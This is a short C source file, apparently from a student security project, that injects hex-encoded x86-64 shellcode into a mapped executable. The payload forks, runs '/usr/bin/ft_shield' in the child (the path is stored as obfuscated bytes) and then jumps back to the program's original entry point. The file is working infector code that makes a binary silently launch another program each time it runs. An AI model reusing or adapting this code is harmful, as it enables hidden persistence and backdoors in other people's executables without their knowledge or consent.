/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: dhubleur <dhubleur@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/05/22 13:07:13 by dhubleur          #+#    #+#             */
/*   Updated: 2024/06/12 22:04:21 by jmaia            ###   ###               */
/*                                                                            */
/* ************************************************************************** */

#include "woody.h"

char payload[] = "\x55\x50\x57\x56\x52\x53\xb8\x39\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x75\x24\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x23\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x5b\x5a\x5e\x5f\x58\x5d";
char jmp[] = "\xe9\x00\x00\x00\x00";
char data[] = "\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x66\x74\x5f\x73\x68\x69\x65\x6c\x64";

#define PAYLOAD_LENGTH (sizeof(payload)-1 + sizeof(jmp)-1 + sizeof(data)-1)
#define PAYLOAD_CODE_LENGTH (sizeof(payload)-1 + sizeof(jmp)-1)

size_t get_payload_length()
{
	return (PAYLOAD_LENGTH);
}

void inject(t_injection injection)
{
	int32_t jmp_adr = (int32_t)(injection.old_entrypoint - (injection.new_entrypoint + PAYLOAD_CODE_LENGTH));
	memcpy(jmp + 1, &jmp_adr, sizeof(jmp_adr));

	char *ptr = injection.file_map + injection.payload_offset;
	memcpy(ptr, payload, sizeof(payload) - 1);
	ptr += sizeof(payload) - 1;
	memcpy(ptr, jmp, sizeof(jmp) - 1);
	ptr += sizeof(jmp) - 1;
	memcpy(ptr, data, sizeof(data) - 1);
}
